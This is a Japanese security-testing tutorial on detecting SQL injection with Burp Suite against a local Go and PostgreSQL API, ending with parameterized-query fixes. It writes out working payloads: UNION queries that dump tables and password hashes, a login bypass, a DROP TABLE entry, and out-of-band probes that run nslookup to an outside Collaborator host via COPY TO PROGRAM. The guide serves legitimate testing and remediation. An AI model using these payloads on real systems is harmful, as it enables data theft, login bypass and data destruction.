# Burp Suite — SQL インジェクション 検出手順

## 対象脆弱性

**SQL インジェクション (SQLi)** — OWASP Top 10: A03 Injection

ユーザ入力がサニタイズされずに SQL クエリへ直接埋め込まれることで、攻撃者がデータベースを不正に操作できる脆弱性。

---

## 検証対象の想定環境

```
Go バックエンド (Gin フレームワーク) + PostgreSQL
エンドポイント:
  GET  /api/users?id=1
  POST /api/login       {"username":"alice","password":"pass"}

脆弱なコード例 (Go):
// URL パラメータ
query := "SELECT * FROM users WHERE id = " + r.URL.Query().Get("id")

// JSON ボディ
query := "SELECT * FROM users WHERE username = '" + req.Username + "'"
```

---

## 事前準備

### 1. Burp Suite の起動

```bash
# GUI 起動
burpsuite

# または
java -jar burpsuite_community.jar
```

### 2. ブラウザのプロキシ設定

```
Firefox: 設定 → ネットワーク設定
HTTP プロキシ: 127.0.0.1  ポート: 8080
「HTTPS にもこのプロキシを使用する」チェック
```

### 3. CA 証明書のインポート

```
ブラウザで http://burpsuite にアクセス
→ "CA Certificate" をクリックしてダウンロード
→ Firefox: 設定 → 証明書を表示 → インポート
   「この認証局によるウェブサイトの識別を信頼する」チェック
```

---

## 手順 1: トラフィックのキャプチャ

### Intercept でリクエストを捕捉

```
1. Proxy タブ → "Intercept is on" になっていることを確認
2. ブラウザで http://localhost:8080/api/users?id=1 にアクセス
3. Burp に以下のリクエストが停止される:

   GET /api/users?id=1 HTTP/1.1
   Host: localhost:8080
   Authorization: Bearer eyJhb...

4. "Forward" で送信
5. レスポンスを確認:
   {"id":1,"name":"Alice","email":"alice@example.com"}
```

### HTTP history に記録されたことを確認

```
Proxy → HTTP history タブ
→ /api/users?id=1 が記録されている
```

---

## 手順 2: Repeater で手動 SQLi テスト

### Repeater に送信

```
HTTP history → /api/users?id=1 を右クリック
→ "Send to Repeater" を選択
```

### テスト 1: シングルクォートでエラーを誘発

```
Repeater タブ → リクエストを以下に変更:

GET /api/users?id=1' HTTP/1.1
Host: localhost:8080

"Send" をクリック
```

**脆弱な場合のレスポンス例**:
```json
HTTP/1.1 500 Internal Server Error

{"error":"pq: unterminated quoted string at or near \"'\""}
```

SQL エラーが露出 → SQLi 確定

### テスト 2: 真偽テストで差異を確認

```
# 常に真の条件
GET /api/users?id=1 AND 1=1-- HTTP/1.1

→ レスポンス: {"id":1,"name":"Alice","email":"alice@example.com"}
```

```
# 常に偽の条件
GET /api/users?id=1 AND 1=2-- HTTP/1.1

→ レスポンス: {} または 404
```

2つのレスポンスが異なれば SQLi が確定。

### テスト 3: UNION ベースでカラム数を特定

```
# カラム数を特定 (エラーが出なくなるまで NULL を増やす)
GET /api/users?id=1 ORDER BY 1-- HTTP/1.1   → 正常
GET /api/users?id=1 ORDER BY 2-- HTTP/1.1   → 正常
GET /api/users?id=1 ORDER BY 3-- HTTP/1.1   → エラー → カラム数は 2

# UNION で任意データを取得
GET /api/users?id=-1 UNION SELECT 1,version()-- HTTP/1.1

→ レスポンス: {"id":1,"name":"PostgreSQL 15.3 on x86_64"}
```

### テスト 4: 機密情報の取得

```
# テーブル一覧を取得 (PostgreSQL)
GET /api/users?id=-1 UNION SELECT 1,table_name FROM information_schema.tables-- HTTP/1.1

# users テーブルのカラム一覧
GET /api/users?id=-1 UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users'-- HTTP/1.1

# パスワードハッシュを取得
GET /api/users?id=-1 UNION SELECT 1,password FROM users-- HTTP/1.1
```

---

## 手順 3: JSON ボディへの SQLi テスト (POST エンドポイント)

Burp Suite は JSON ボディのパラメータも自動的に挿入ポイントとして認識する。

### Intercept で POST リクエストを捕捉

```
1. ブラウザで POST /api/login を実行
   {"username":"alice","password":"wrongpass"}

2. Burp に停止されたリクエストを Repeater に送信
```

### Repeater での手動テスト

```
POST /api/login HTTP/1.1
Host: localhost:8080
Content-Type: application/json

{"username":"alice' --","password":"anything"}
```

**脆弱な場合**: username フィールドに `' --` を挿入することでパスワードチェックをスキップしてログインできる。

```
# レスポンス
HTTP/1.1 200 OK
{"token":"eyJhbGci...","user":{"id":1,"name":"Alice"}}
```

---

## 手順 4: Intruder でブルートフォース的に SQLi ペイロードをテスト

### Intruder に送信

```
Repeater → リクエストを右クリック → "Send to Intruder"
```

### 挿入ポイントの設定

```
Intruder → Positions タブ
→ "Clear §" をクリックして全ての挿入ポイントをクリア
→ id パラメータの値を選択して "Add §":

GET /api/users?id=§1§ HTTP/1.1
```

### ペイロードの設定

```
Intruder → Payloads タブ
→ Payload type: Simple list
→ 以下を追加:

1'
1 AND 1=1--
1 AND 1=2--
1 OR 1=1--
1; DROP TABLE users--
1 UNION SELECT NULL--
1 UNION SELECT NULL,NULL--
1 AND SLEEP(5)--
1; SELECT pg_sleep(5)--
```

### スキャン実行と結果分析

```
"Start attack" をクリック

結果テーブルで以下を確認:
- Status が 500 のリクエスト → SQLエラー誘発
- Length が通常と異なるリクエスト → レスポンス差異
- 応答時間が 5 秒以上のリクエスト → 時間ベース Blind SQLi
```

---

## 手順 5: Scanner による自動検出 (Professional 版)

### スキャンの開始

```
HTTP history → /api/users?id=1 を右クリック
→ "Scan" を選択

Scan configuration:
  → "Audit checks" → "SQL injection" のみ有効化
  → "Start"
```

### スキャン結果の確認

```
Dashboard → Issue activity タブ
→ "SQL injection" が表示される

クリックすると:
  - 脆弱な URL
  - 挿入されたパラメータ
  - 使用ペイロード
  - リクエスト / レスポンスの詳細
  - 修正方法
  が表示される
```

---

## 手順 6: Burp Collaborator で Blind SQLi (OOB) を検出 (Professional 版)

エラーもレスポンス差異も出ない場合、DNS コールバックで確認する。

### Collaborator ペイロードの取得

```
Burp メニュー → Burp Collaborator client
→ "Copy to clipboard" をクリック
→ ペイロード例: abcde1234.burpcollaborator.net
```

### Repeater でペイロードを使用 (PostgreSQL)

```
GET /api/users?id=1;COPY (SELECT '') TO PROGRAM 'nslookup abcde1234.burpcollaborator.net'-- HTTP/1.1

# または (PostgreSQL の dblink を使う場合)
GET /api/users?id=1 UNION SELECT dblink_connect('host=abcde1234.burpcollaborator.net')-- HTTP/1.1
```

### コールバックの確認

```
Burp Collaborator client → "Poll now" をクリック
→ DNS Lookup が表示されれば OOB SQLi が確定

表示される情報:
  - コールバックの種類 (DNS / HTTP)
  - ソース IP
  - タイムスタンプ
```

---

## 手順 7: Comparer でレスポンス差異を可視化

真偽テストの差異を視覚的に確認する。

```
# Repeater で "真" のレスポンスを Comparer に送信
右クリック → "Send to Comparer" → response

# Repeater で "偽" のレスポンスを Comparer に送信
同様に操作

Comparer タブ → "Words" ボタン
→ 差異がハイライトされる
```

---

## 手順 8: レポート出力 (Professional 版)

```
Dashboard → Issue activity → 全選択
右クリック → "Report issues"

→ Format: HTML / XML
→ 出力先を指定 → "Next" → "Generate"
```

Community 版の場合:

```
# 発見した脆弱性を手動でスクリーンショット・記録
Proxy → HTTP history → エクスポート機能でリクエストを保存
```

---

## 手順 9: 自動化 (Enterprise 版)

```bash
# REST API でスキャンを開始
curl -X POST "http://localhost:1337/v0.1/scan?api-key=your-key" \
  -H "Content-Type: application/json" \
  -d '{
    "urls": ["http://localhost:8080"],
    "scan_configurations": [
      {"name": "Audit checks - SQL injection"}
    ]
  }'

# 結果取得
curl "http://localhost:1337/v0.1/scan/<scan-id>/issues?severity=high"
```

---

## Burp Suite による SQLi 検出の限界

| 限界 | 内容 |
|------|------|
| Community 版の Scanner なし | 自動スキャンは Professional 版のみ。Community では手動テストが必須 |
| OOB SQLi (Community) | Collaborator は Pro 版のみ使用可能 |
| 二次 SQLi | 入力が一度 DB に保存されてから実行される SQLi は自動追跡が難しい |
| ビジネスロジック依存の SQLi | 特定のワークフロー内でのみ発動する SQLi は手動テストが必要 |

---

## 修正方法 (Go コード)

### 脆弱なコード

```go
// NG: 文字列結合 (URL パラメータ)
id := c.Query("id")
query := "SELECT * FROM users WHERE id = " + id
db.QueryRow(query)

// NG: 文字列結合 (JSON ボディ)
query := "SELECT * FROM users WHERE username = '" + req.Username + "'"
```

### 修正後のコード

```go
// OK: パラメータ化クエリ (変数を安全に渡す仕組み) (database/sql)
id := c.Query("id")
row := db.QueryRow("SELECT * FROM users WHERE id = $1", id)

// OK: パラメータ化クエリ (ログイン)
row := db.QueryRow(
    "SELECT id, password_hash FROM users WHERE username = $1",
    req.Username,
)

// OK: GORM を使う場合
db.Where("id = ?", id).First(&user)
db.Where("username = ?", req.Username).First(&user)

// NG (GORM でも文字列結合は危険):
db.Where("id = " + id).First(&user)  // ← これは危険
```

### 入力バリデーションも追加する

```go
// ID が数値かどうかを確認
id, err := strconv.Atoi(c.Query("id"))
if err != nil {
    c.JSON(400, gin.H{"error": "invalid id"})
    return
}
```
